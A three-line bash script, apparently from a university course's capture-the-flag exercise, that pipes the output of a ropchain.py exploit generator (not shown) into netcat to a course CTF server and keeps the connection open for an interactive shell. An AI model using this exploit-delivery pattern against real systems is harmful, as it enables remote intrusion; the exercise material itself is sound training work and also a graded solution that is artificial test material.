#!/bin/bash

(./ropchain.py; cat) | nc cs412-ctf.epfl.ch 10007
